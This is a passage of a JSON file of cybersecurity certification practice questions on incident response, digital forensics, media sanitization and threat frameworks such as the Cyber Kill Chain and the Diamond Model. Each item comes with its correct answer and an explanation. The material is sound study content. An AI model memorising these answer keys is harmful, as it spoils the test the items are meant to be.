services"},{"id":"d3-17","set":"d3","ch":10,"d":3,"q":"During an investigation into a compromised system, Nathan discovers signs of an advanced persistent threat (APT) resident in his organization’s administrative systems. How should he classify this threat?","o":["Significant impact to noncritical services","Denial of noncritical services","Significant impact to critical services","Denial of critical services or loss of control"],"a":3,"e":"Discovering an APT in your administrative systems typically indicates that you have lost control of your environment.","l":"c10-evidence","l2":"","k":"functional impact critical services"},{"id":"d3-18","set":"d3","ch":10,"d":3,"q":"Melissa is using the US-CERT’s scale to measure the impact of the location of observed activity by a threat actor. Which of the following should be the highest rated threat activity location?","o":["Critical system screened subnet (DMZ)","Business network","Business screened subnet (DMZ)","Safety systems"],"a":3,"e":"Human safety and human lives are always the most critical system or resource. Here, safety systems should receive the highest rating, and in the US-CERT NCISS demo, they receive 100/100 points on the scale.","l":"c10-evidence","l2":"","k":"US-CERT incident impact scale"},{"id":"d3-19","set":"d3","ch":10,"d":3,"q":"Derek’s organization has been working to recover from a recent malware infection that caused outages across the organization during an important part of their business cycle. To properly triage, what should Derek pay the most attention to first?","o":["The immediate impact on operations so that his team can restore functionality","The total impact of the event so that his team can provide an accurate final report","The immediate impact on operations so that his team can identify the likely threat actor","The total impact of the event so that his team can build a new threat model for future use"],"a":0,"e":"During an event, incident responders often have to pay more attention to the immediate impact to triage and prioritize remediation. Once systems are back online and the business is operating, total impact can be assessed and should be included in the report and considered in new controls and practices from the lessons learned analysis of the event.","l":"c10-evidence","l2":"c11-recover","k":"incident impact triage"},{"id":"d3-20","set":"d3","ch":10,"d":3,"q":"Jeff discovers multiple JPEG photos during his forensic investigation of a computer involved in an incident. When he runs <code>exiftool</code> to gather file metadata, which information is not likely to be part of the images even if they have complete metadata intact?","o":["GPS location","Camera type","Number of copies made","Correct date/timestamp"],"a":2,"e":"The amount of metadata included in photos varies based on the device used to take them, but GPS location, GPS timestamp-based time (and thus correct, rather than device native), and camera type can all potentially be found. Image files do not track how many times they have been copied!","l":"c10-analysis","l2":"","k":"JPEG metadata analysis"},{"id":"d3-21","set":"d3","ch":1,"d":3,"q":"John has designed his network as shown here and places untrusted systems that want to connect to the network into the Guests network segment. What is this type of segmentation called?\n<figure><img alt=\"Diagram depicts network architecture with the Internet connecting through firewalls to a screened subnet, high security, users, and guests.\" loading=\"lazy\" src=\"img/pt/c03fun002.png\"/></figure>","o":["Proactive network segmentation","Isolation","Quarantine","Removal"],"a":0,"e":"John is not responding to an incident, so this is an example of proactive network segmentation. If he discovered a system that was causing issues, he might create a dedicated quarantine network or could isolate or remove the system.","l":"c1-network","l2":"c2-netarch","k":"proactive network segmentation"},{"id":"d3-22","set":"d3","ch":9,"d":3,"q":"The organization that Jamal works for classifies cybersecurity related events using NIST’s standard definitions. Which classification should he use when he discovers key logging software on one of his frequent business traveler’s laptop?","o":["An event","An adverse event","A cybersecurity incident","A policy violation"],"a":2,"e":"NIST describes events like this as cybersecurity incidents because they are a violation or imminent threat of violation of security policies and practices. An adverse event is any event with negative consequences, and an event is any observable occurrence on a system or network.","l":"c9-process","l2":"","k":"cybersecurity incident definition"},{"id":"d3-23","set":"d3","ch":9,"d":3,"q":"Dan is designing a segmented network that places systems with different levels of security requirements into different subnets with firewalls and other network security devices between them. What phase of the incident response process is Dan in?","o":["Post-incident activity","Detection and analysis","Preparation","Containment, eradication, and recovery"],"a":2,"e":"Dan’s efforts are part of the preparation phase, which involves activities intended to limit the damage an attacker could cause.","l":"c9-process","l2":"c1-network","k":"incident response preparation phase"},{"id":"d3-24","set":"d3","ch":10,"d":3,"q":"An analyst is investigating a potential insider data theft and is instructed to collect a laptop for possible legal action. The analyst creates a forensic image of the drive, generates hash values, records every individual who handles the device and the image, and secures the original laptop in an evidence locker.\n<p>By documenting each person who takes possession of the device or its image, which forensic principle is the analyst primarily preserving?</p>","o":["Establishing an event timeline","Maintaining chain of custody","Validating investigation scope","Following escalation procedures"],"a":1,"e":"The analyst is preserving chain of custody because carefully recording every person who handles the original laptop or its forensic image, along with securing the evidence, is specifically intended to prove that the evidence remained controlled, untampered, and traceable from collection through potential court use. Establishing an event timeline refers to reconstructing when actions occurred on systems or in logs, which is about sequencing events rather than tracking who handled evidence. Validating investigation scope involves confirming what systems, users, and data are in or out of the investigation, not documenting evidence handling. Following escalation procedures is about notifying the right stakeholders and moving the case through organizational levels, which may be important, but it’s not what is achieved by detailed custody documentation.","l":"c10-analysis","l2":"","k":"chain of custody preservation"},{"id":"d3-25","set":"d3","ch":11,"d":3,"q":"While working to restore systems to their original configuration after a long-term APT compromise, Manish has three options. Which option should Manish choose in this scenario?\n<ul class=\"none\"><li>\n<ol class=\"upper-alpha\">\n<li>He can restore from a backup and then update patches on the system.</li>\n<li>He can rebuild and patch the system using original installation media and application software using his organization’s build documentation.</li>\n<li>He can remove the compromised accounts and rootkit tools and then fix the issues that allowed the attackers to access the systems.</li></ol></li></ul>","o":["Option A.","Option B.","Option C.","None of the above. Manish should hire a third party to assess the systems before proceeding."],"a":1,"e":"In cases where an advanced persistent threat (APT) has been present for an unknown period of time, backups should be assumed to be compromised. Since APTs often have tools that cannot be detected by normal antimalware techniques, the best option that Manish has is to carefully rebuild the systems from the ground up and then ensure that they are fully patched and secured before returning them to service.","l":"c11-recover","l2":"","k":"system recovery after APT"},{"id":"d3-26","set":"d3","ch":10,"d":3,"q":"Jessica wants to access a macOS FileVault 2–encrypted drive. Which of the following methods is not a possible means of unlocking the volume?","o":["Change the FileVault key using a trusted user account.","Retrieve the key from memory while the volume is mounted.","Acquire the recovery key.","Extract the keys from iCloud."],"a":0,"e":"FileVault does allow trusted accounts to unlock the drive but not by changing the key. FileVault 2 keys can be recovered from memory for mounted volumes, and much like BitLocker, it suggests that users record their recovery key, so Jessica may want to ask the user or search their office or materials if possible. Finally, FileVault keys can be recovered from iCloud, providing her with a third way to get access to the drive.","l":"c10-analysis","l2":"","k":"FileVault encrypted drive access"},{"id":"d3-27","set":"d3","ch":5,"d":3,"q":"Susan discovers the following log entries that occurred within seconds of each other in her security monitoring console. What have her network sensors most likely detected?\n<figure><img alt=\"Screenshot depicts a log listing 6 entries with severity, timestamps, V N C scan, and S Q L port alert descriptions, codes, and percentages.\" loading=\"lazy\" src=\"img/pt/c03fun003.png\"/></figure>","o":["A failed database connection from a server","A denial-of-service attack","A port scan","A misconfigured log source"],"a":2,"e":"The series of connection attempts shown is most likely associated with a port scan. A series of failed connections to various services within a few seconds (or even minutes) is common for a port scan attempt. A denial-of-service attack will typically be focused on a single service, whereas an application that cannot connect will be configured to point at only one database service, not many. A misconfigured log source either would send the wrong log information or would not send logs at all in most cases.","l":"c5-portscan","l2":"c3-network","k":"port scan detection"},{"id":"d3-28","set":"d3","ch":11,"d":3,"q":"If Suki wants to purge a drive, which of the following options will accomplish her goal?","o":["Cryptographic erase","Reformat","Overwrite","Repartition"],"a":0,"e":"Purging requires complete removal of data, and cryptographic erase is the only option that will fully destroy the contents of a drive from this list. Reformatting leaves the original data in place, overwriting leaves the potential for file remnants in slack space, and repartitioning also leaves data intact in the new partitions.","l":"c11-recover","l2":"","k":"drive purge cryptographic erase"},{"id":"d3-29","set":"d3","ch":6,"d":3,"q":"While performing post-rebuild validation efforts, Scott scans a server from a remote network and sees no vulnerabilities. Joanna, the administrator of the machine, runs a scan and discovers two critical vulnerabilities and five moderate issues. What is most likely causing the difference in their reports?","o":["Different patch levels were used during the scans.","They are scanning through a load balancer.","There is a firewall between the remote network and the server.","Scott and Joanna ran the vulnerability scan with different settings."],"a":2,"e":"Local scans often provide more information than remote scans because of network or host firewalls that block access to services. The second most likely answer is that Scott or Joanna used different settings when they scanned.","l":"c6-config","l2":"c1-network","k":"firewall impact vulnerability scanning"},{"id":"d3-30","set":"d3","ch":10,"d":3,"q":"As part of his organization’s cooperation in a large criminal case, Adam’s forensic team has been asked to send a forensic image of a highly sensitive compromised system in RAW format to an external forensic examiner. What steps should Adam’s team take prior to sending a drive containing the forensic image?","o":["Encode in E01 format and provide a hash of the original file on the drive.","Encode in FTK format and provide a hash of the new file on the drive.","Encrypt the RAW file and deliver the hash and encryption key via separate secure channels.","Decrypt the RAW file and deliver the hash via separate channels."],"a":2,"e":"A general best practice when dealing with highly sensitive systems is to encrypt copies of the drives before they are sent to third parties. Adam should encrypt the drive image and provide both the hash of the image and the decryption key via separate secure channels to ensure that losing the drive itself does not expose the data. Once the image is in the third-party examiner’s hands, they will be responsible for its security. Adam may want to check on what their agreement says about security.","l":"c10-analysis","l2":"c2-crypto","k":"forensic evidence transmission security"},{"id":"d3-31","set":"d3","ch":10,"d":3,"q":"Mika wants to analyze the contents of a drive without causing any changes to the drive. What method is best suited to ensuring this?","o":["Set the “read-only” jumper on the drive.","Use a write blocker.","Use a read blocker.","Use a forensic software package."],"a":1,"e":"A hardware write blocker can ensure that connecting or mounting the drive does not cause any changes to occur on the drive. Mika should create one or more forensic images of the original drive and then work with the copy or copies as needed. She may then opt to use forensic software, possibly including a software write blocker.","l":"c10-analysis","l2":"c10-evidence","k":"write blocker data preservation"},{"id":"d3-32","set":"d3","ch":10,"d":3,"q":"What type of forensic investigation–related form is shown here?\n<figure><img alt=\"Forensic investigation form with three blank sections of entry fields, a copy history table, and a custody log table.\" loading=\"lazy\" src=\"img/pt/c03fun004.png\"/></figure>","o":["Chain of custody","Report of examination","Forensic discovery log","Policy custody release"],"a":0,"e":"This form is a sample chain of custody form. It includes information about the case; copies of drives that were created; and who was in possession of drives, devices, and copies during the investigation.","l":"c10-analysis","l2":"","k":"chain of custody form"},{"id":"d3-33","set":"d3","ch":10,"d":3,"q":"James wants to determine whether other Windows systems on his network are infected with the same malware package that he has discovered on the workstation he is analyzing. He has removed the system from his network by unplugging its network cable, as required by corporate policy. He knows that the system has previously exhibited beaconing behavior and wants to use that behavior to identify other infected systems. How can he safely create a fingerprint for this beaconing without modifying the infected system?","o":["Plug the system into the network and capture the traffic quickly at the firewall using Wireshark or <code>tcpdump</code>.","Plug the system into an isolated switch and use a span port or tap and Wireshark/<code>tcpdump</code> to capture traffic.","Review the ARP cache for outbound traffic.","Review the Windows Defender Firewall log for traffic logs."],"a":1,"e":"James can temporarily create an untrusted network segment and use a span port or tap to allow him to see traffic leaving the infected workstation. Using Wireshark or <code>tcpdump</code>, he can build a profile of the traffic it sends, helping him build a fingerprint of the beaconing behavior. Once he has this information, he can then use it in his recovery efforts to ensure that other systems are not similarly infected.","l":"c10-evidence","l2":"c3-tools","k":"network traffic evidence capture"},{"id":"d3-34","set":"d3","ch":9,"d":3,"q":"After completing an incident response process and providing a final report to management, what step should Casey use to identify improvement to her incident response plan?","o":["Update system documentation.","Conduct a lessons learned session.","Review patching status and vulnerability scans.","Engage third-party consultants."],"a":1,"e":"Conducting a lessons learned review after using an incident response plan can help to identify improvements and to ensure that the plan is up-to-date and ready to handle new events.","l":"c9-process","l2":"c11-recover","k":"incident lessons learned review"},{"id":"d3-35","set":"d3","ch":10,"d":3,"q":"During a forensic investigation, Lukas discovers that he needs to capture a virtual machine that is part of the critical operations of his company’s website. If he cannot suspend or shut down the machine for business reasons, what imaging process should he follow?","o":["Take a snapshot of the running virtual machine to capture its memory and disk state, then copy the snapshot files for analysis.","Copy the virtual disk files and then use a memory capture tool.","Escalate to management to get permission to suspend the system to allow a true forensic copy.","Use a tool like the Volatility Framework to capture the live machine completely."],"a":0,"e":"Modern hypervisors let you snapshot a virtual machine while it keeps running, freezing the base disk and capturing a copy of memory without any interruption to operations. That gives Lukas a clean point-in-time capture while the company website stays up, and he can then copy the snapshot files off for analysis. Copying the virtual disk files while the machine is actively running produces an inconsistent image, because the files shift underneath you mid-copy as data is written. Escalating to management to suspend the system ignores the scenario’s core constraint, since business needs rule out suspending the machine, and a live snapshot makes suspension unnecessary anyway. And the Volatility Framework analyzes memory images rather than acquiring them, so it cannot capture a live machine completely; it pulls nothing from disk and would still need a separate acquisition step to produce the memory image it works on.","l":"c10-evidence","l2":"c2-infra","k":"virtual machine snapshot acquisition"},{"id":"d3-36","set":"d3","ch":10,"d":3,"q":"Mika, a computer forensic examiner, receives a PC and its peripherals that were seized as forensic evidence during an investigation. After she signs off on the chain of custody log and starts to prepare for her investigation, one of the first things she notes is that each cable and port was labeled with a color-coded sticker by the onsite team. Why are the items labeled like this?","o":["To ensure chain of custody","To ensure correct reassembly","To allow for easier documentation of acquisition","To tamper-proof the system"],"a":1,"e":"Reassembling the system to match its original configuration can be important in forensic investigations. Color-coding each cable and port as a system is disassembled before moving helps to ensure proper reassembly. Mika should also have photos taken by the onsite investigators to match her reassembly work to the onsite configuration.","l":"c10-evidence","l2":"","k":"forensic hardware evidence collection"},{"id":"d3-37","set":"d3","ch":3,"d":3,"q":"While reviewing her web server logs, Selah discovers the error message shown here. What should she do about this error?\n<figure><img alt=\"Screenshot of web server shows sample demo website with Apache 404 Errors alert marked critical, duration 1 day 6 hours, and count 1 of 1.\" loading=\"lazy\" src=\"img/pt/c03fun005.png\"/></figure>","o":["Check for evidence of a port scan.","Review the Apache error log.","Reboot the server to restore the service.","Restart the Apache service."],"a":1,"e":"Selah should check the error log to determine what web page or file access resulted in 404 “not found” errors. The errors may indicate that a page is linked incorrectly, but it may also indicate a scan occurring against her web server.","l":"c3-cloud-social","l2":"c3-tools","k":"web server error log"},{"id":"d3-38","set":"d3","ch":11,"d":3,"q":"Lakshman needs to sanitize hard drives that will be leaving his organization after a lease is over. The drives contained information that his organization classifies as sensitive data that competitors would find valuable if they could obtain it. Which choice is the most appropriate to ensure that data exposure does not occur during this process?","o":["Clear, validate, and document.","Purge the drives.","Cryptographic erase, validate, and document.","The drives must be destroyed to ensure no data loss."],"a":2,"e":"Cryptographic erase with validation and documentation is most appropriate here because it provides purge-level sanitization by rendering data unrecoverable through destruction of encryption keys while still allowing the leased drives to be returned, and the explicit validation and documentation help prove the sanitization was successful and properly managed. Simply clearing, even with validation and documentation, generally offers a lower level of protection and may be vulnerable to advanced recovery techniques, which is not ideal for sensitive data valuable to competitors. Purging without specifying how it will be verified and recorded omits critical controls needed to demonstrate that exposure risk has been minimized and that the organization met its due diligence. Physically destroying the drives would indeed prevent data loss but conflicts with the leased nature of the hardware and is usually unnecessary and impractical when strong cryptographic erase with proper verification is available.","l":"c11-recover","l2":"","k":"media sanitization cryptographic erase"},{"id":"d3-39","set":"d3","ch":2,"d":3,"q":"Selah is preparing to collect a forensic image for a Macintosh computer running the Tahoe operating system. What hard drive format is she most likely to encounter?","o":["FAT32","MacFAT","APFS","HFS+"],"a":2,"e":"The default macOS drive format is Apple File System (APFS) and is the native macOS drive format. macOS does support FAT32 and can read New Technology File System (NTFS) but cannot write to NTFS drives without additional software. HFS+ was the default filesystem for earlier versions of macOS.","l":"c2-os","l2":"c10-evidence","k":"macOS APFS file system"},{"id":"d3-40","set":"d3","ch":9,"d":3,"q":"A threat hunter is documenting an intrusion using the Diamond Model. The investigation found:<ul class=\"square\">\n<li>A PowerShell script that downloads and runs an obfuscated payload.</li>\n<li>Outbound connections to <code>update-checkcloudsync-service.com</code>.</li>\n<li>The attacker used a compromised VPN account belonging to a finance employee.</li>\n<li>The command server resolved to multiple rotating IP addresses over several days.</li></ul>\n<p>Which pairing correctly maps the Diamond Model elements for capability and infrastructure?</p>","o":["Capability = compromised VPN account; Infrastructure = finance employee","Capability = PowerShell downloader/payload; Infrastructure = rotating IPs and <code>update-checkcloudsync-service.com</code>","Capability = finance employee; Infrastructure = PowerShell downloader/payload","Capability = rotating IPs and domain; Infrastructure = compromised VPN account"],"a":1,"e":"Capability in the Diamond Model refers to the tools, malware, and techniques the adversary uses, which in this case is the PowerShell script that downloads and runs an obfuscated payload, representing the attacker’s functional ability to execute code and maintain access, while infrastructure refers to the systems and services the adversary leverages on the network, such as the rotating IP addresses and the <code>update-checkcloudsync-service.com</code> domain used for command and control. Treating the compromised VPN account as capability misclassifies a credential and initial access vector rather than a technical toolset, and labeling a finance employee as infrastructure or capability confuses a human victim with attacker-owned or controlled resources. Likewise, assigning infrastructure to the compromised VPN account reverses the roles, since that account is a means of access, not the backend C2 or staging environment that actually supports the attacker’s operations.","l":"c9-frameworks","l2":"","k":"Diamond Model intrusion analysis"},{"id":"d3-41","set":"d3","ch":10,"d":3,"q":"Jessica wants to recover deleted files from slack space and needs to identify where the files begin and end. What is this process called?","o":["Slacking","Data carving","Disk recovery","Header manipulation"],"a":1,"e":"Data carving is the process of identifying files based on file signatures such as headers and footers and then pulling the information between those locations out as a file. Jessica can use common carving tools or could manually carve files if she knows common header and footer types that she can search for.","l":"c10-evidence","l2":"c10-analysis","k":"forensic data carving"},{"id":"d3-42","set":"d3","ch":9,"d":3,"q":"Latisha is the IT manager for a small company and occasionally serves as the organization’s information security officer. Who would be the most appropriate leader for her organization’s CSIRT?","o":["Her lead IT support staff technician.","Her organization’s legal counsel.","A third-party IR team lead.","She should select herself."],"a":3,"e":"A CSIRT leader must have authority to direct the incident response process and should be able to act as a liaison with organizational management. Although Latisha may not have deep incident response experience, she is in the right role to provide those connections and leadership. She should look at retaining third-party experts for incidents if she needs additional skills or expertise on her IR team.","l":"c9-foundation","l2":"","k":"CSIRT team leader authority"},{"id":"d3-43","set":"d3","ch":9,"d":3,"q":"During an incident, an analyst observes the following activity on a workstation:<ul class=\"square\">\n<li><code>rundll32.exe</code> launching with a suspicious DLL from a user-writable directory</li>\n<li>Periodic DNS queries with unusually long subdomains (high-entropy strings) to a single external domain</li>\n<li>No direct outbound HTTP/HTTPS sessions to that domain</li></ul>\n<p>Using MITRE ATT&amp;CK terminology, which tactic best describes the suspicious DNS activity?</p>","o":["Lateral movement","Command and control","Initial access","Impact"],"a":1,"e":"The suspicious DNS activity aligns with command and control because periodic DNS queries using long, high-entropy subdomains to a single external domain strongly indicate a covert communication channel or beaconing mechanism that malware uses to talk to a remote controller without obvious HTTP or HTTPS traffic. Lateral movement describes techniques for moving from one internal system to another, such as using remote services or pass-the-hash, which is not evidenced by the DNS pattern alone. Initial access covers how the adversary first gained entry, such as phishing, drive-by compromise, or exploiting a public-facing application, and the described behavior is about ongoing communication after a foothold already exists. Impact involves actions that directly affect data or system availability or integrity, such as encryption, data destruction, or service disruption, rather than the maintenance of control via stealthy DNS communications.","l":"c9-frameworks","l2":"c3-network","k":"Cyber Kill Chain command control"},{"id":"d3-44","set":"d3","ch":9,"d":3,"q":"A security operations team reviews proxy logs and discovers that an external IP address has been systematically querying the organization’s public-facing website, harvesting employee names and email addresses from the “About Us” and “Leadership” pages. No exploitation attempts have been observed. Using the Lockheed Martin Cyber Kill Chain, which phase does this activity represent?","o":["Reconnaissance","Delivery","Weaponization","Installation"],"a":0,"e":"This activity represents the reconnaissance phase of the Cyber Kill Chain because the external actor is gathering information about the organization that could be used to craft a targeted attack later. No payload has been created or sent yet, which rules out the other phases. Weaponization involves coupling a remote access trojan or exploit with a deliverable payload, which has not occurred. Delivery is the transmission of the weapon to the target environment, such as through a phishing email or compromised website, and no such transmission is described. Installation involves the adversary establishing persistence on a victim system after exploitation, which is well beyond the activity shown here.","l":"c9-frameworks","l2":"c5-recon","k":"Cyber Kill Chain reconnaissance"},{"id":"d3-45","set":"d3","ch":10,"d":3,"q":"Because of external factors, Eric has only a limited time period to collect an image from a workstation. If he collects only specific files of interest, what type of acquisition has he performed?","o":["Logical","Bit-by-bit","Sparse","None of the above"],"a":0,"e":"A logical acquisition focuses on specific files of interest, such as a specific type of file or files from a specific location. In Eric’s case, a logical acquisition meets his needs. A sparse acquisition also collects data from unallocated space. A bit-by-bit acquisition is typically performed for a full drive and will take longer.","l":"c10-evidence","l2":"","k":"logical forensic acquisition"},{"id":"d3-46","set":"d3","ch":10,"d":3,"q":"During a forensic investigation, Kwame records information about each drive, including where it was acquired, who made the forensic copy, the SHA-256 hash of the drive, and other details. What term describes the process Kwame is using as he labels evidence with details of who acquired and validated it?","o":["Direct evidence","Circumstantial evidence","Incident logging","Chain of custody"],"a":3,"e":"The chain of custody for evidence is maintained by logging and labeling evidence. The chain of custody ensures that the evidence is properly controlled and accessed.","l":"c10-analysis","l2":"","k":"chain of custody tracking"},{"id":"d3-47","set":"d3","ch":10,"d":3,"q":"Susan needs to perform forensics on a virtual machine. What process should she use to ensure she gets all of the forensic data she may need?","o":["Suspend the machine and copy the contents of the directory it resides in.","Perform a live image of the machine.","Suspend the machine and make a forensic copy of the drive it resides on.","Turn the virtual machine off and make a forensic copy of it."],"a":0,"e":"Suspending a virtual machine will result in the RAM and disk contents being stored to the directory where it resides. Simply copying that folder is then sufficient to provide Susan with all the information she needs. She should not turn the virtual machine off, and creating a forensic copy of the drive is not necessary (but she should still validate hashes for the copied files or directory).","l":"c10-evidence","l2":"c2-infra","k":"virtual machine forensic acquisition"},{"id":"d3-48","set":"d3","ch":10,"d":3,"q":"During an investigation of a ransomware attack, the incident response team collects firewall logs showing an inbound connection at 02:14 UTC, EDR alerts showing malicious process execution at 02:16 UTC, and Active Directory logs showing a new service account created at 02:31 UTC. The team arranges these events chronologically to determine the attack progression and identify the window between initial access and privilege escalation. Which incident response analysis technique is the team performing?","o":["Data integrity validation","Triage","Establishment of a timeline","Preservation"],"a":2,"e":"The team is establishing a timeline by sequencing events from multiple independent log sources in chronological order to reconstruct the progression of the attack. This technique is critical for understanding how quickly the attacker moved through each stage, identifying gaps in detection, and determining when key milestones like privilege escalation occurred. Data integrity validation involves verifying that evidence has not been altered, typically through hash comparisons, which is not what is described. Triage is the initial assessment used to determine severity and prioritize response actions, not the detailed chronological reconstruction of attack events. Preservation involves collecting and securing evidence to prevent alteration or loss, which is a prerequisite for timeline analysis but not the analysis itself.","l":"c10-analysis","l2":"","k":"forensic timeline reconstruction"},{"id":"d3-49","set":"d3","ch":10,"d":3,"q":"While Chris is attempting to image a device, he encounters write issues and cannot write the image as currently set (refer to the image shown here). What issue is he most likely encountering?\n<figure><img alt=\"Screenshot depicts the Select Image Destination dialog box with folder, filename, fragment size, compression, and encryption checkbox.\" loading=\"lazy\" src=\"img/pt/c03fun006.png\"/></figure>","o":["The files need to be compressed.","The destination drive is formatted FAT32.","The destination drive is formatted NTFS.","The files are encrypted."],"a":1,"e":"FTK Imager Lite is shown configured to write a single large file that will fail on FAT32-formatted drives where the largest single file is 4 GB. If Chris needs to create a single file, he should format his destination drive as NTFS. In many cases, he should simply create a raw image to a blank disk instead!","l":"c10-evidence","l2":"c2-os","k":"forensic imaging filesystem limitations"},{"id":"d3-50","set":"d3","ch":10,"d":3,"q":"Saanvi needs to validate the SHA-256 checksum of a file on a Windows system to ensure that there were no unauthorized changes to the binary file. He is not allowed to install any programs and cannot run files from external media or drives. What Windows utility can Saanvi use to get the SHA-256 hash of the file?","o":["<code>md5sum</code>","<code>certutil</code>","<code>sha1sum</code>","<code>hashcheck</code>"],"a":1,"e":"Modern versions of Windows include the built-in <code>certutil</code> utility. Running <code>certutil -hashfile [file location] SHA256</code> will calculate the SHA-256 hash of a file. <code>certutil</code> also supports SHA-1 and SHA-512 as well as other less frequently used hashes. <code>md5sum</code> and <code>sha1sum</code> are Linux utilities, and <code>hashcheck</code> is a shell extension for Windows.","l":"c10-analysis","l2":"c2-crypto","k":"certutil file hash verification"},{"id":"d3-51","set":"d3","ch":11,"d":3,"q":"Forensic investigation shows that the target of an investigation used the Windows Quick Format command to attempt to destroy evidence on a USB thumb drive. Which of the NIST sanitization techniques has the target of the investigation used in their attempt to conceal evidence?","o":["Clear","Purge","Destroy","None of the above"],"a":3,"e":"The Windows Quick Format option leaves data in unallocated space on the new volume, allowing the data to be carved and retrieved. This does not meet the requirements for any of the three levels of sanitization defined by NIST.","l":"c11-recover","l2":"","k":"NIST media sanitization methods"},{"id":"d3-52","set":"d3","ch":11,"d":3,"q":"During an incident response process, Susan plugs a system back into the network, allowing it normal network access. What phase of the incident response process is Susan performing?","o":["Preparation","Detection and analysis","Recovery","Post-incident activity"],"a":2,"e":"Restoring a system to normal function, including removing it from isolation, is part of the recovery stage. This may seem to be part of the post-incident activity phase, but that phase includes activities such as reporting and process updates rather than system restoration.","l":"c11-recover","l2":"c11-contain","k":"incident recovery phase"},{"id":"d3-53","set":"d3","ch":10,"d":3,"q":"A company suspects data theft and receives notice that litigation is likely. Legal issues a legal hold for the affected users. During evidence acquisition, an analyst images a laptop drive and records the hash of the image. Later, another analyst attempts to verify the image integrity, but the hash does <i>not</i> match the original value. What is the <i>best</i> next action?","o":["Continue analysis using the existing image and note the mismatch in the final report.","Re-image the drive using validated tools and a write blocker, document the discrepancy, and preserve the original media under the legal hold.","Delete the original image and replace it with the new hash value to maintain consistency.","Immediately wipe the laptop to prevent further data loss and begin recovery actions."],"a":1,"e":"Re-imaging the drive using validated forensic tools and a write blocker while documenting the hash discrepancy and preserving the original media under the legal hold is the best action because it both remediates the integrity issue and maintains evidentiary defensibility by showing due diligence and a clear response to potential image corruption or mishandling. Simply continuing analysis on an image whose hash does not match, even if noted in the report, undermines the reliability of any findings and is vulnerable to legal challenge. Deleting the original image and replacing the hash value destroys an important record of the problem, appears deceptive, and compromises the chain of custody. Immediately wiping the laptop to begin recovery conflicts with the legal hold obligation, risks spoliation of evidence, and removes the primary source from which a clean, verifiable image can be obtained.","l":"c10-analysis","l2":"c10-evidence","k":"forensic image integrity verification"},{"id":"d3-54","set":"d3","ch":10,"d":3,"q":"Janet is attempting to conceal her actions on a company-owned computer. As part of her cleanup attempts, she deletes all the files she downloaded from a corporate file server using a browser in incognito mode. How can a forensic investigator determine what files she downloaded?","o":["Network flows","SMB logs","Browser cache","Drive analysis"],"a":3,"e":"A forensic investigator’s best option is to seize, image, and analyze the drive that Janet downloaded the files to. Since she only deleted the files, it is likely that the investigator will be able to recover most of the content of the files, allowing them to be identified. Network flows do not provide file information, SMB does not log file downloads, browser caches will typically not contain a list of all downloaded files, and incognito mode is specifically designed to not retain session and cache information.","l":"c10-evidence","l2":"c10-analysis","k":"forensic drive analysis"},{"id":"d3-55","set":"d3","ch":11,"d":3,"q":"Jose is aware that an attacker has compromised a system on his network but wants to continue to observe the attacker’s efforts as they continue their attack. If Jose wants to prevent additional impact on his network while watching what the attacker does, what containment method should he use?","o":["Removal","Isolation","Segmentation","Detection"],"a":1,"e":"Jose can choose to isolate the compromised system, either physically or logically, leaving the attacker with access to the system while isolating it from other systems on his network. If he makes a mistake, he could leave his own systems vulnerable, but this will allow him to observe the attacker.","l":"c11-contain","l2":"","k":"attacker network isolation"},{"id":"d3-56","set":"d3","ch":9,"d":3,"q":"A cybersecurity team discovers that several employees received a spear-phishing email with a link to a “secure document portal.” Proxy logs show multiple users clicked the link, but EDR telemetry shows no malware execution and no persistence artifacts on endpoints. The web gateway did record downloads of an ISO file from the portal.\n<p>Which Cyber Kill Chain phase is the defender <i>most</i> likely interrupting by blocking the portal domain and removing the email from inboxes?</p>","o":["Reconnaissance","Delivery","Installation","Command and control"],"a":1,"e":"Blocking the portal domain and removing the phishing email from inboxes is interrupting delivery because the attacker’s payload is being transmitted via the spear phishing message and the malicious portal link that serves the ISO file, and stopping access to that content prevents further payloads from reaching endpoints even though some users already clicked. Reconnaissance happens earlier when the attacker profiles targets and gathers information to craft the spear phishing campaign, which is not what the defenders are disrupting here. Installation would occur only after the payload is executed and installs persistence mechanisms on the victim systems, yet there is no evidence of malware execution or persistence in the EDR data. Command and control would require an already installed payload reaching out to an external server for instructions, which has not been observed and is not what is being blocked by taking down the email and portal access.","l":"c9-frameworks","l2":"","k":"Cyber Kill Chain delivery phase"},{"id":"d3-57","set":"d3","ch":9,"d":3,"q":"During an incident response process, Cynthia conducts a lessons learned review. What phase of the incident response process is she in?","o":["Preparation","Detection and analysis","Containment, eradication, and recovery","Post-incident activity"],"a":3,"e":"Lessons learned reviews are typically conducted by independent facilitators who ask questions like “What happened, and at what time?” and “What information was needed, and when?” Lessons learned reviews are conducted as part of the post-incident activity stage of incident response and provide an opportunity for organizations to improve their incident response process.","l":"c9-process","l2":"c11-recover","k":"post incident activity phase"},{"id":"d3-58","set":"d3","ch":9,"d":3,"q":"As part of his incident response program, Allan is designing a playbook for zero-day threats. Which of the following should not be in his plan to handle them?","o":["Segmentation","Patching","Using threat intelligence","Allow listing/whitelisting"],"a":1,"e":"Although patching is useful, it won’t stop zero-day threats. If Allan is building a plan specifically to deal with zero-day threats, he should focus on designing his network and systems to limit the possibility and impact of an unknown vulnerability. That includes using threat intelligence, using segmentation, using allow listing/whitelisting applications, implementing only necessary firewall rules, using behavior and baseline-based intrusion prevention rules and SIEM alerts, and building a plan in advance.","l":"c9-foundation","l2":"c8-controls","k":"zero day incident playbook"},{"id":"d3-59","set":"d3","ch":9,"d":3,"q":"As the CISO of her organization, Mei is working on an incident classification scheme and wants to base her design on NIST’s definitions. Which of the following options should she use to best describe a user accidentally accessing a file that they are not authorized to view?","o":["An incident","An event","An adverse event","A security incident"],"a":2,"e":"NIST describes events with negative consequences as adverse events. It might be tempting to immediately call this a security incident; however, this wouldn’t be classified that way until an investigation was conducted. If the user accidentally accessed the file, it would typically not change classification. Intentional or malicious access would cause the adverse event to become a security incident.","l":"c9-process","l2":"","k":"NIST adverse event classification"},{"id":"d3-60","set":"d3","ch":10,"d":3,"q":"Fred wants to identify digital evidence that can place an individual in a specific place at a specific time. Which of the following types of digital forensic data is not commonly used to attempt to document physical location at specific times?","o":["Cell phone GPS logs","Photograph metadata","Cell phone tower logs","Microsoft Office document metadata"],"a":3,"e":"Cell phones contain a treasure trove of location data, including both tower connection log data and GPS location logs in some instances. Photographs taken on mobile devices may also include location metadata. Microsoft Office files do not typically include location information.\n<p>Other potential sources of data include car GPS systems if the individual has a car with built-in GPS, black-box data-gathering systems, social media posts, and fitness apps, as well as any other devices that may have built-in GPS or location detection capabilities. In some cases, this can be as simple as determining whether the individual’s devices were connected to a specific network at a specific 